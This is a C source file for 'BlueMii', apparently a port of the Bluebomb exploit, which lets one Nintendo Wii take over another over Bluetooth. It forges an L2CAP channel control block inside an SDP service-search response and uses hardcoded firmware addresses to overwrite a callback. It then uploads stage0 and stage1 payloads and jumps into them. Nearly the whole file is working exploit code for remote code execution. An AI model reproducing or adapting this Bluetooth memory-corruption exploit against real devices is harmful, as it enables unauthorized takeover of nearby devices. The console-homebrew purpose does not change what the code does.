#include <stdio.h>
#include <stdlib.h>
#include <gccore.h>
#include <string.h>
#include "stream_macros.h"
#include "stage0/stage0_bin.h"
#include "stage1_bin.h"
#include "lwbt/bluetooth.h"
#include "lwbt/btarch.h"
#include "lwbt/l2cap.h"
#include "lwbt/btpbuf.h"
#include "lwbt/hci.h"
#include <unistd.h>
#include <ogc/lwp_watchdog.h>

#define SDP_ERROR_RSP				0x01
#define SDP_SERVICE_SEARCH_REQ		0x02
#define SDP_SERVICE_SEARCH_RSP		0x03
#define SDP_SERVICE_ATTR_REQ		0x04
#define SDP_SERVICE_ATTR_RSP		0x05
#define SDP_SERVICE_SEARCH_ATTR_REQ	0x06
#define SDP_SERVICE_SEARCH_ATTR_RSP	0x07

static void *xfb = NULL;
static GXRModeObj *rmode = NULL;
static u64 redeploy_at = 0;

struct payload_info_t {
	void *payload;
	size_t length;
	size_t remaining;
};

static void SyncButton(u32 held)
{
	
}

void jump_payload(struct l2cap_pcb *pcb) {
	err_t ret = ERR_OK;
	if ((ret = l2cap_signal(pcb, L2CAP_ECHO_RSP, 1, &(pcb->remote_bdaddr), NULL)) != ERR_OK) {
		fprintf(stderr, "jump_payload: Failed to send signal packet (%d)\n", ret);
	}
}

#define PAYLOAD_MTU 1024

err_t upload_payload(struct l2cap_pcb *pcb, struct payload_info_t* payload_info) {
	err_t ret = 0;
	struct pbuf *data;
	
	int packet_size = payload_info->remaining >= PAYLOAD_MTU ? PAYLOAD_MTU : payload_info->remaining % PAYLOAD_MTU;
	if((data = btpbuf_alloc(PBUF_RAW, packet_size, PBUF_RAM)) == NULL) {
		fprintf(stderr, "upload_payload: Could not allocate memory for pbuf\n");
		return ERR_MEM;
	}

	memcpy(data->payload, payload_info->payload + payload_info->length- payload_info->remaining, packet_size);

	if ((ret = l2cap_signal(pcb, L2CAP_ECHO_RSP, 0, &(pcb->remote_bdaddr), data)) != ERR_OK) {
		fprintf(stderr, "upload_payload: Failed to send payload packet (%d)\n", ret);
		return ret;
	}

	payload_info->remaining -= packet_size;

	fprintf(stderr, "\r%d / %d", payload_info->length - payload_info->remaining, payload_info->length);
	fflush(stderr);

	if (payload_info->remaining == 0) {
		return 1;
	}

	return ERR_OK;
}

#define PAYLOAD_RESP(a,b) ((u16_t)((a) << 8) | (b))

err_t bluebomb_success2(void *arg, struct l2cap_pcb *pcb, u16_t resp, u8_t id)
{
	struct payload_info_t* payload_info = (struct payload_info_t*)arg;

	bool done_uploading = false;
	if (PAYLOAD_RESP('S','0')) {
		done_uploading = upload_payload(pcb, payload_info);
	}

	if (done_uploading) {
		fprintf(stderr, "\nJumping to payload!\n");
		jump_payload(pcb);
		l2ca_bluebomb(pcb, NULL);

		redeploy_at = gettime() + millisecs_to_ticks(100);
	}
	
	return ERR_OK;
}

err_t bluebomb_success(void *arg, struct l2cap_pcb *pcb, u16_t resp, u8_t id)
{
	struct payload_info_t* payload_info = (struct payload_info_t*)arg;

	if (PAYLOAD_RESP('S','0')) {
		fprintf(stderr, "Got response!\nUploading payload...\n0 / %d", payload_info->length);
		fflush(stderr);
		l2ca_bluebomb(pcb, bluebomb_success2);
		return bluebomb_success2(arg, pcb, resp, id);
	}
	
	return ERR_OK;
}

err_t bluebomb_disconnected_ind(void *arg, struct l2cap_pcb *pcb, err_t err)
{
	struct payload_info_t* payload_info = (struct payload_info_t*)arg;
	payload_info->remaining = 0;

	l2cap_close(pcb);
	return ERR_OK;
}

uint32_t L2CB = 0;

err_t do_hax(struct l2cap_pcb *pcb) {
	err_t ret;
	struct pbuf *data;
	
	fprintf(stderr, "Overwriting callback in switch case 0x9.\n");
	
	if((data = btpbuf_alloc(PBUF_RAW, L2CAP_CMD_REJ_SIZE+4, PBUF_RAM)) == NULL) {
		fprintf(stderr, "do_hax: Could not allocate memory for pbuf\n");
		return ERR_MEM;
	}

	((u16_t *)data->payload)[0] = htole16(L2CAP_INVALID_CID);
	((u16_t *)data->payload)[1] = htole16(0x0000); // rcid (from faked ccb)
	((u16_t *)data->payload)[2] = htole16(0x0040 + 0x1f); // lcid

	if ((ret = l2cap_signal(pcb, L2CAP_CMD_REJ, 0, &(pcb->remote_bdaddr), data)) != ERR_OK) {
		fprintf(stderr, "do_hax: Failed to send hax packet (%d)\n", ret);
		return ret;
	}
	
	fprintf(stderr, "Trigger switch statement 0x9.\n");

	if ((ret = l2cap_signal(pcb, L2CAP_ECHO_RSP, 0, &(pcb->remote_bdaddr), NULL)) != ERR_OK) {
		fprintf(stderr, "do_hax: Failed to send trigger packet (%d)\n", ret);
		return ret;
	}

	return ERR_OK;
}

struct ccb {
	uint8_t in_use;
	uint32_t chnl_state;
	uint32_t p_next_ccb;
	uint32_t p_prev_ccb;
	uint32_t p_lcb;
	uint16_t local_cid;
	uint16_t remote_cid;
	// We only go up to the fields we care about, you should still leave the rest blank as there are some fields that should be just left zero after it like the timer object.
};

err_t send_sdp_service_response(struct l2cap_pcb *pcb,u16_t tid) {
	uint16_t required_size = 1 + 2 + 2 + 2 + 2 + (0x15 * 4) + 1;
	uint32_t SDP_CB = L2CB + 0xc00;
	
	err_t ret;

	uint8_t *p;
	struct pbuf *data;

	fprintf(stderr, "Sending SDP service response\n");
	if((data = btpbuf_alloc(PBUF_RAW, required_size, PBUF_RAM)) == NULL) {
		fprintf(stderr, "send_sdp_service_response: Could not allocate memory for pbuf\n");
		return ERR_MEM;
	}

	struct ccb fake_ccb;
	p = data->payload;
	memset(&fake_ccb, 0x00, sizeof(struct ccb));
	fake_ccb.in_use = 1;
	fake_ccb.chnl_state = htobe32(0x00000002); // CST_TERM_W4_SEC_COMP
	fake_ccb.p_next_ccb = htobe32(SDP_CB + 0x68);
	fake_ccb.p_prev_ccb = htobe32(L2CB + 8 + 0x54 - 8);
	fake_ccb.p_lcb = htobe32(L2CB + 0x8);
	fake_ccb.local_cid = htobe16(0x0000);
	fake_ccb.remote_cid = htobe16(0x0000); // Needs to match the rcid sent in the packet that uses the faked ccb.
	
	UINT8_TO_BE_STREAM(p, SDP_SERVICE_SEARCH_RSP); // SDP_ServiceSearchResponse
	UINT16_TO_BE_STREAM(p, tid); // Transaction ID
	UINT16_TO_BE_STREAM(p, 0x0059); // ParameterLength
	UINT16_TO_BE_STREAM(p, 0x0015); // TotalServiceRecordCount
	UINT16_TO_BE_STREAM(p, 0x0015); // CurrentServiceRecordCount
	memcpy(p + (0xa * 4), &fake_ccb, sizeof(struct ccb)); p += (0x15 * 4); // Embed payload in ServiceRecordHandleList
	UINT8_TO_BE_STREAM(p, 0x00); // ContinuationState

	if ((ret = l2ca_datawrite(pcb,data)) != ERR_OK) {
		fprintf(stderr, "send_sdp_service_response: Failed to send SDP service response packet (%d)\n", ret);
		return ret;
	}

	btpbuf_free(data);

	return ERR_OK;
}

static err_t __bluebomb_receive_dohax(void *arg,struct l2cap_pcb *pcb,struct pbuf *p,err_t err)
{
	err_t ret = ERR_OK;
	fprintf(stderr, "Doing hax\n");
	if ((ret = do_hax(pcb)) == ERR_OK) {
		l2ca_bluebomb(pcb, bluebomb_success);
		fprintf(stderr, "Awaiting response from stage0\n");
		l2cap_recv(pcb,NULL);
	}
	return ret;
}

// TODO: Figure out the real MTU instead of choosing semi-random numbers
#define SDP_MTU 0xD0

s32 size_remaining = 0;

err_t send_sdp_attribute_response(struct l2cap_pcb *pcb,u16_t tid, void* payload, int len) {
	err_t ret = ERR_OK;

	uint8_t *p = NULL;
	struct pbuf *data = NULL;
	
	if (size_remaining == 0) {
		size_remaining = len;
		int payload_size = (size_remaining > SDP_MTU) ? SDP_MTU : size_remaining;
		uint16_t packet_size = 1 + 2 + 2 + 2 + 1 + 1 + 1 + 2 + 1 + payload_size + 1;
		fprintf(stderr, "Sending SDP attribute response\n");
	
		if((data = btpbuf_alloc(PBUF_RAW, packet_size, PBUF_RAM)) == NULL) {
			fprintf(stderr, "send_sdp_attribute_response: Could not allocate memory for pbuf\n");
			return ERR_MEM;
		}

		p = data->payload;
		UINT8_TO_BE_STREAM(p, SDP_SERVICE_ATTR_RSP); // SDP_ServiceAttributeResponse
		UINT16_TO_BE_STREAM(p, tid); // Transaction ID
		UINT16_TO_BE_STREAM(p, 2 + 1 + 1 + 1 + 2 + 1 + SDP_MTU + 1); // ParameterLength
		UINT16_TO_BE_STREAM(p, 1 + 1 + 1 + 2 + 1 + SDP_MTU); // AttributeListByteCount
		UINT8_TO_BE_STREAM(p, 0x35); // DATA_ELE_SEQ_DESC_TYPE and SIZE_1
		UINT8_TO_BE_STREAM(p, 0x02); // size of data elements
		UINT8_TO_BE_STREAM(p, 0x09); // UINT_DESC_TYPE and SIZE_2
		UINT16_TO_BE_STREAM(p, 0xbeef); // The dummy int
		UINT8_TO_BE_STREAM(p, 0x00); // padding so instruction is 0x4 aligned
		memcpy(p, payload, payload_size); p += payload_size; // payload
		UINT8_TO_BE_STREAM(p, size_remaining <= SDP_MTU ? 0x00 : 0x01); // ContinuationState

		if ((ret = l2ca_datawrite(pcb,data)) != ERR_OK) {
			fprintf(stderr, "send_sdp_attribute_response: Failed to send SDP attribute response packet (%d)\n", ret);
			btpbuf_free(data);
			return ret;
		}

		btpbuf_free(data);
		
		size_remaining -= payload_size;

		if (size_remaining <= 0) {
			l2cap_recv(pcb,__bluebomb_receive_dohax);
		}
	} else if (size_remaining > 0) {
		int payload_size = (size_remaining > SDP_MTU) ? SDP_MTU : size_remaining;
		uint16_t packet_size = 1 + 2 + 2 + 2 + payload_size + 1;
		if((data = btpbuf_alloc(PBUF_RAW, packet_size, PBUF_RAM)) == NULL) {
			fprintf(stderr, "send_sdp_attribute_response: Could not allocate memory for pbuf\n");
			return ERR_MEM;
		}

		p = data->payload;
		// We don't have to care about giving a valid attribute sequence this time so just stick the payload right in.
		UINT8_TO_BE_STREAM(p, 0x05); // SDP_ServiceAttributeResponse
		UINT16_TO_BE_STREAM(p, tid); // Transaction ID
		UINT16_TO_BE_STREAM(p, 2 + SDP_MTU + 1); // ParameterLength
		UINT16_TO_BE_STREAM(p, SDP_MTU); // AttributeListByteCount
		memcpy(p, payload + len - size_remaining, payload_size); p += (payload_size); // payload
		UINT8_TO_BE_STREAM(p, size_remaining <= SDP_MTU ? 0x00 : 0x01); // ContinuationState
		
		if ((ret = l2ca_datawrite(pcb,data)) != ERR_OK) {
			fprintf(stderr, "send_sdp_attribute_response: Failed to send SDP attribute response packet (%d)\n", ret);
			btpbuf_free(data);
			return ret;
		}

		btpbuf_free(data);
		
		size_remaining -= payload_size;

		if (size_remaining <= 0) {
			l2cap_recv(pcb,__bluebomb_receive_dohax);
		}
	}

	return ERR_OK;
}

static err_t __bluebomb_receive(void *arg,struct l2cap_pcb *pcb,struct pbuf *p,err_t err)
{
	err_t ret = ERR_OK;
	//fprintf(stderr, "__bluebomb_receive[%02x]\n",*(char*)buffer);
	if (pcb->psm == SDP_PSM) {
		u8_t hdr = *(u8_t *)p->payload;
		u16_t tid = be16toh(*((u16_t*)((u8_t *)p->payload) + 1));
		//fprintf(stderr, "SDP PDU %d, tid %d\n", hdr, tid);
	
		switch (hdr) {
			case SDP_SERVICE_SEARCH_REQ:
				ret = send_sdp_service_response(pcb, tid);
				break;
			case SDP_SERVICE_ATTR_REQ:
				ret = send_sdp_attribute_response(pcb, tid, stage0_bin, stage0_bin_len);
				break;
		}
	}

	return ret;
}

static err_t __bluebomb_accept_step2(void *arg,struct l2cap_pcb *l2cappcb,err_t err)
{
	struct l2cap_pcb **pcb = (struct l2cap_pcb **)arg;

	fprintf(stderr, "Got connection handle: %p\n", l2cappcb);

	if (err == ERR_OK) {
		l2cap_recv(l2cappcb,__bluebomb_receive);
		l2cap_disconnect_ind(l2cappcb,bluebomb_disconnected_ind);
		*pcb = l2cappcb;
	} else {
		l2cap_close(l2cappcb);
	}

	return err;
}

s32 bluebomb_listenasync(struct l2cap_pcb **pcb, struct bd_addr *bdaddr)
{
	u32 level;
	s32 err = ERR_OK;
	struct l2cap_pcb *l2capcb = NULL;

	LOG("bluebomb_listenasync()\n");
	_CPU_ISR_Disable(level);

	if((l2capcb = l2cap_new()) == NULL) {
		err = ERR_MEM;
		goto error;
	}
	l2cap_arg(l2capcb,pcb);

	err = l2cap_connect_ind(l2capcb,bdaddr,SDP_PSM,__bluebomb_accept_step2);
	if(err != ERR_OK) {
		l2cap_close(l2capcb);
	}

error:
	_CPU_ISR_Restore(level);
	LOG("bluebomb_listenasync(%02x)\n",err);
	return err;
}

s32_t bluebomb_accept(s32 result, void *userdata)
{
	err_t ret;
	struct l2cap_pcb **pcb = (struct l2cap_pcb **)userdata;

	fprintf(stderr, "Waiting to accept\n");

	if((ret = bluebomb_listenasync(pcb, BD_ADDR_ANY)) != ERR_OK) {
		fprintf(stderr, "bluebomb_accept: bluebomb_listenasync failed(%d)", ret);
	}

	return ret;
}

bool poweroff = false;

void WiiPowerPressed()
{
    poweroff = true;
}

//---------------------------------------------------------------------------------
int main(int argc, char **argv) {
//---------------------------------------------------------------------------------
	struct l2cap_pcb *sdp_pcb = NULL;

	struct payload_info_t payload_info = {
		.payload = stage1_bin,
		.length = stage1_bin_length,
		.remaining = 0
	};

	// Initialise the video system
	VIDEO_Init();

	// Obtain the preferred video mode from the system
	// This will correspond to the settings in the Wii menu
	rmode = VIDEO_GetPreferredMode(NULL);

	// Allocate memory for the display in the uncached region
	xfb = MEM_K0_TO_K1(SYS_AllocateFramebuffer(rmode));

	// Initialise the console, required for printf
	CON_Init(xfb, 20, 20, rmode->fbWidth-20, rmode->xfbHeight-20, rmode->fbWidth*VI_DISPLAY_PIX_SZ);
	//SYS_STDIO_Report(true);

	// Set up the video registers with the chosen mode
	VIDEO_Configure(rmode);

	// Tell the video hardware where our display memory is
	VIDEO_SetNextFramebuffer(xfb);

	// Clear the framebuffer
	VIDEO_ClearFrameBuffer(rmode, xfb, COLOR_BLACK);

	// Make the display visible
	VIDEO_SetBlack(false);

	// Flush the video register changes to the hardware
	VIDEO_Flush();

	// Wait for Video setup to complete
	VIDEO_WaitVSync();
	if(rmode->viTVMode&VI_NON_INTERLACE) VIDEO_WaitVSync();

	SYS_SetPowerCallback(WiiPowerPressed);

	// This function initialises the attached controllers
	//WPAD_Init();

	//tell wpad to output the IR data
	//WPAD_SetDataFormat(WPAD_CHAN_ALL, WPAD_FMT_BTNS_ACC_IR);

	//set console starting position to the second row, to make space for tv's offsets
	fprintf(stderr, "\x1b[2;0H");

	fprintf(stderr, "BlueMii (Bluebomb v1.5)\n");
	fprintf(stderr, "Original code by Fullmetal5, port by Zarithya\n");
	
	bool test = TRUE;
	uint32_t payload_addr = 0x81780000; // 512K before the end of mem 1

	while(1) 
	{
		//reset console location to 8th row
		//fprintf(stderr, "\x1b[8;0H");

		// Call WPAD_ScanPads each loop, this reads the latest controller states
		//WPAD_ScanPads();
		
		/*for (int i = 0; i <= 3; i++)
		{
			//clear line and print the wiimote's data
			fprintf(stderr, "\33[2K\r");
			WPADData* data = WPAD_Data(i);
			if(data->data_present)
				fprintf(stderr, "wiimote %d: x -> %f y-> %f angle -> %f\n", i, data->ir.x, data->ir.y, data->ir.angle);
			else
				fprintf(stderr, "wiimote %d: Disconnected\n", i);
		}*/

		// WPAD_ButtonsDown tells us which buttons were pressed in this loop
		// this is a "one shot" state which will not fire again until the button has been released
		//u32 pressed = WPAD_ButtonsDown(0) | WPAD_ButtonsDown(1) | WPAD_ButtonsDown(2) | WPAD_ButtonsDown(3);

		// We return to the launcher application via exit
		//if ( pressed & WPAD_BUTTON_HOME ) break;

		//if ( pressed & WPAD_BUTTON_PLUS )
		if (test)
		{
			test = FALSE;
			//WPAD_Shutdown();
			//fprintf(stderr, "Bluetooth shut down, starting Bluebomb\n");
			L2CB = 0x811725E0; // 4.3u
			
			if (L2CB >= 0x81000000) {
				fprintf(stderr, "Detected system menu\n");
				payload_addr = 0x80004000;
			}

			fprintf(stderr, "App settings:\n");
			fprintf(stderr, "\tL2CB: 0x%08X\n", L2CB);
			fprintf(stderr, "\tpayload_addr: 0x%08X\n", payload_addr);
			
			*(uint32_t*)(stage0_bin + 0x8) = htobe32(payload_addr);
	
			BT_Init(bluebomb_accept, &sdp_pcb);
			hci_sync_btn(SyncButton);
		}

		if (sdp_pcb && payload_info.remaining == 0) {
			payload_info.remaining = stage1_bin_length;
			l2cap_arg(sdp_pcb, &payload_info);
		}

		if ((redeploy_at > 0) && (gettime() >= redeploy_at)) {
			redeploy_at = 0;
			hci_disconnect(&sdp_pcb->remote_bdaddr, HCI_OTHER_END_TERMINATED_CONN_USER_ENDED);
			sdp_pcb = NULL;
			bluebomb_accept(0, &sdp_pcb);
		}

		// Wait for the next frame
		VIDEO_WaitVSync();

		if (poweroff) {
			SYS_ResetSystem(SYS_POWEROFF,0,0);
			break;
		}
	}

	// loop over all wiimotes and disconnect them
	// this would shutdown the wiimotes and they would only respond after have pressed a button again
	// under normal circumstances, this is not wanted and is why it's disabled here
	// its more user friendly if the wiimote is left in a seeking state so that the launcher can pick it back up again
#if 0
	for (int i = 0;i < WPAD_MAX_WIIMOTES ;i++)
	{
		if(WPAD_Probe(i,0) < 0)
			continue;
		WPAD_Flush(i);
		WPAD_Disconnect(i);
	}
#endif

	// Shutdown the WPAD system
	// Any wiimotes that are connected will be force disconnected
	// this results in any connected wiimotes to be left in a seeking state
	// in a seeking state the wiimotes will automatically reconnect when the subsystem is reinitialized
	//WPAD_Shutdown();
	BT_Shutdown();

	return 0;
}
